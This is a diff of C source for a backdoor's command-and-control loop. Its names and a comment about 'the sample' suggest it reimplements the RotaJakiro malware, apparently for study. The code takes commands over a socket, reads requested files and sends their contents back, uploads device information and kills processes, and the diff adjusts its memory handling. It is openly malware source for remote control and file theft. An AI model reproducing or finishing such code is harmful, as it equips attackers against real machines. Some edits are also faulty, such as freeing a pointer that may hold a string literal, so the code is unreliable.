@@ -50,6 +50,7 @@ void c2_loop(){
 
     // interactive c2 loop
     while (1) {
+        int i = 0;
         printf("(%d) In c2 loop...\n", getpid());
 
         // receive
@@ -65,11 +66,12 @@ void c2_loop(){
         maxlen -= n;
         len += n;
 
-        char *cmd_id = (char *)malloc(4);
+        //char *cmd_id = (char *)malloc(4);
+        char *cmd_id = NULL;
         int payload_length;
 
         // zero out cmd id
-        memset(cmd_id, 0, 4);
+        //memset(cmd_id, 0, 4);
 
         // parse out cmd id
         cmd_id = parse_c2_cmdid(buffer);
@@ -127,6 +129,7 @@ void c2_loop(){
                 struct stat stats;
                 stat(payload, &stats);
 
+                // malloc data w/ size of file
                 char *data = (char *)malloc(stats.st_size);
                 memset(data, 0, stats.st_size);
 
@@ -140,7 +143,6 @@ void c2_loop(){
                 char *msg = "file does not exist";
                 build_c2_response(msg, cmd_id, sock);
             }
-
         }
         else if (memcmp(&rota_c2_upload_dev_info, cmd_id, 4) == 0) {
             #ifdef DEBUG
@@ -231,14 +233,18 @@ void c2_loop(){
         }
 
         sleep(sleepy_time);
+        free(payload);
+        free(cmd_id);
+        memset(buffer, 0, strlen(buffer));
     }
 
-    memset(buffer, 0, strlen(buffer));
-    sleep(sleepy_time);
+        memset(buffer, 0, strlen(buffer));
+        sleep(sleepy_time);
     }
 
     free(initial_pkt);
     close(sock);
+    exit(0);
 }
 
 
@@ -298,13 +304,9 @@ void c2_exit(int sock) {
     memcpy(tmpPid, shmem_pid_addr, 4);
     kill(*tmpPid, SIGKILL);
 
+    free(tmpPid);
     // closing
     close(sock);
-}
-
-void c2_test() {
-    // TODO: resolve embedded C2 domains and try to connect.
-    // TODO: if this fails, what does the sample do?
 }
 
 
@@ -442,7 +444,8 @@ char *parse_c2_payload( char *buffer, int length) {
         #ifdef DEBUG
         fprintf(stderr, "error allocating data in parse_c2_pkt");
         #endif
-        exit(1);
+        payload = "error allocating data";
+        return payload;
     }
     memset(payload, 0, length);
     // copy last N-bytes from rota payload
@@ -474,4 +477,5 @@ void build_c2_response(char *buffer, char *cmd_id, int sock){
     memcpy(&rota_resp_pkt[82], buffer, buffer_len);
 
     send(sock, rota_resp_pkt, (82 + buffer_len), 0);
+    free(rota_resp_pkt);
 }
